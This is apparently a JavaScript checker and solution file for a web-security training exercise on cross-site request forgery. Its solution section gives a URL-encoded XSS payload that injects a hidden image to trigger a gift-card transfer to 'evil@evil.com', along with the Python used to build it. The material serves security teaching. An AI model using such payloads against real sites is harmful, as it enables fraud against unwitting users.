function contains(arr, item) {
    for (var i in arr) {
        if (arr[i] === item) { return true; }
    }
    return false;
}

$(function() {
    var images = $('img').toArray();
    console.log(images);
    var injected_src = '';

    for (var i in images) {
        var $image = $(images[i]);
        console.log($image);
        console.log($image.attr('src'));
        if ($image.attr('src').indexOf('/csrf/gift-card') > -1) {
            injected_src = $image.attr('src');
            break;
        }
    }

    if (!injected_src && window.location.search.length > 3) {
        alert("I see you any trying the exercise. Keep going and you'll get it!");
        return; // has started, but no valid image can be found
    } else if (!injected_src) {
        return; // has not started yet
    }

    var qs = injected_src.match(/.*\?(.*)/)[1 ].split('&');

    if (!contains(qs, 'email=evil@evil.com')) {
        alert("Your injected image doesn't have the correct email specified.");
        return;
    }

    if (!contains(qs, 'amount=100')) {
        alert("Your injected image doesn't have the correct amount specified.");
        return;
    }

    alert("You have successfully padded your pockets on the backs of others.");
});

var solutionHTML = FSTR(function(){/*
<h4>Solution</h4>

<p>The link below has the correct URL:</p>

<a href="/csrf/image?qs=%20%20%20%20%20%22%3Bvar%20i%3Ddocument.createElement%28%27img%27%29%3B%20%20%20%20%20
i.src%3D%27/csrf/gift-card%3Femail%3Devil%40evil.com%26amount%3D100%27%3B%20%20%20%20%20i.setAttribute%28%27displa
y%27%2C%20%27none%27%29%3B%20%20%20%20%20document.body.appendChild%28i%29%3B%22">solution link</a>

<p>This querystring was created using interactive Python:</p>

<code>
    from urllib.parse import quote<br>
    url = '/csrf/gift-card?email=evil@evil.com&amp;amount=100'<br>
    js = '''";var i=document.createElement('img');''' +\<br>
    &nbsp;&nbsp;&nbsp;&nbsp;'''i.src=%r;''' +\<br>
    &nbsp;&nbsp;&nbsp;&nbsp;'''i.setAttribute('display', 'none');''' +\<br>
    &nbsp;&nbsp;&nbsp;&nbsp;'''document.body.appendChild(i);"'''<br>
    quote(js % url)
</code>

<p>For Python 2, change the first line to read: <code>from urllib import quote</code>.</p>

<p>In this example we've combined and XSS exploit with a CSRF exploit. This way the domain name on the
    link is familiar to the user. It is also possible to embed images on different sites or within email
    to accomplish the attack.</p>
*/});
